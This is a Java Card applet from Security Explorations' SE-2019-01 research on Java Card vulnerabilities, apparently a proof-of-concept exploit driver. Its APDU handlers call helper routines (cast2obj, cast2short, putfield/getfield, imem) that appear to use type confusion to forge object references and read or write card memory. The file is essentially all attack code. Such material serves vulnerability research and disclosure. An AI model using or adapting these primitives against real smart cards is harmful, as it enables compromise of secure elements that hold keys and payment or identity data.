/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
/*##     http://www.security-explorations.com                                #*/

/* RESEARCH MATERIAL:	SE-2019-01                                            */
/* Security vulnerabilities in Java Card                                      */

/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */

/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
/* SOFTWARE.                                                                  */

package com.se.applets;

import javacard.framework.*;
import com.se.vulns.*;

public class SEApplet extends Applet {
    private final static byte SEApplet_CLA      = (byte)0x80;

    private final static byte GETFIELD_A        = (byte)0x10;
    private final static byte PUTFIELD_A        = (byte)0x11;

    private final static byte GETFIELD_B        = (byte)0x12;
    private final static byte PUTFIELD_B        = (byte)0x13;

    private final static byte GETFIELD_S        = (byte)0x14;
    private final static byte PUTFIELD_S        = (byte)0x15;

    protected SEApplet() {       
      register();
    }

    public static void install(byte[] bArray, short bOffset, byte bLength) {
      new SEApplet();
    }

    public byte[] get_req(APDU apdu,short size) {
      byte[] buffer=apdu.getBuffer();

      byte numBytes=buffer[ISO7816.OFFSET_LC];
      byte byteRead=(byte)(apdu.setIncomingAndReceive());

      if ((numBytes!=size)||(byteRead!=size)) {
        ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
      }

      return buffer;
    }

    public void send_resp(APDU apdu,short size) {
      short availBytes=apdu.setOutgoing();

      if (availBytes<size) {
       ISOException.throwIt(ISO7816.SW_WRONG_LENGTH);
      }

      apdu.setOutgoingLength((byte)size);
      apdu.sendBytes((short)5,(short)size);
    }

    public void getfield_a(APDU apdu) {
     byte buf[]=get_req(apdu,(short)1);

     Object o=Test.getfield_a();
     short dummy=Test.cast2short(o,(short)0);

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void putfield_a(APDU apdu) {
     byte buf[]=get_req(apdu,(short)2);

     short val=(short)((((short)buf[ISO7816.OFFSET_CDATA+0])&0xff)<<(short)8);
     val|=(((short)buf[ISO7816.OFFSET_CDATA+1])&0xff);

     Object o=Test.cast2obj(null,val);

     Test.putfield_a(this);

     int imem[]=Test.imem();

     short dummy=(short)imem.length;

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void getfield_b(APDU apdu) {
     byte buf[]=get_req(apdu,(short)1);

     byte dummy=Test.getfield_b();

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=dummy;
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=dummy;

     send_resp(apdu,(short)2);
    }

    public void putfield_b(APDU apdu) {
     byte buf[]=get_req(apdu,(short)2);

     byte val=buf[ISO7816.OFFSET_CDATA+0];

     Test.putfield_s(val);

     int imem[]=Test.imem();

     short dummy=(short)imem.length;

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void getfield_s(APDU apdu) {
     byte buf[]=get_req(apdu,(short)1);

     short dummy=Test.getfield_s();

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void putfield_s(APDU apdu) {
     byte buf[]=get_req(apdu,(short)2);

     short val=(short)((((short)buf[ISO7816.OFFSET_CDATA+0])&0xff)<<(short)8);
     val|=(((short)buf[ISO7816.OFFSET_CDATA+1])&0xff);

     Test.putfield_s(val);

     int imem[]=Test.imem();

     short dummy=(short)imem.length;

     buf[(short)(ISO7816.OFFSET_CDATA+0)]=(byte)((dummy>>8)&0xff);
     buf[(short)(ISO7816.OFFSET_CDATA+1)]=(byte)(dummy&0xff);

     send_resp(apdu,(short)2);
    }

    public void process(APDU apdu) {
      byte[] buffer=apdu.getBuffer();

      if (buffer[ISO7816.OFFSET_CLA]!=SEApplet_CLA) {
       ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
      }

      switch (buffer[ISO7816.OFFSET_INS]) {
        case GETFIELD_A:
         getfield_a(apdu);
         return;
        case PUTFIELD_A:
         putfield_a(apdu);
         return;
        case GETFIELD_B:
         getfield_b(apdu);
         return;
        case PUTFIELD_B:
         putfield_b(apdu);
         return;
        case GETFIELD_S:
         getfield_s(apdu);
         return;
        case PUTFIELD_S:
         putfield_s(apdu);
         return;
        default:
         ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
      }
    }
}

